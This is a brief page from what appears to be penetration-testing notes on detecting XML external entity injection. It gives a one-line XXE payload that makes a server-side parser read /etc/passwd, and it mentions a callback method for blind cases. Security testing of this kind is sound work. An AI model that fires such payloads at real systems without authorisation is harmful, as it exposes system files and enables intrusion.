# XML external entity checks

[← Foothold quick reference](../02-foothold.md)

If XML is parsed server-side, compare a normal document with:

## Entity check
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

No file output: use a callback to test blind entity resolution.
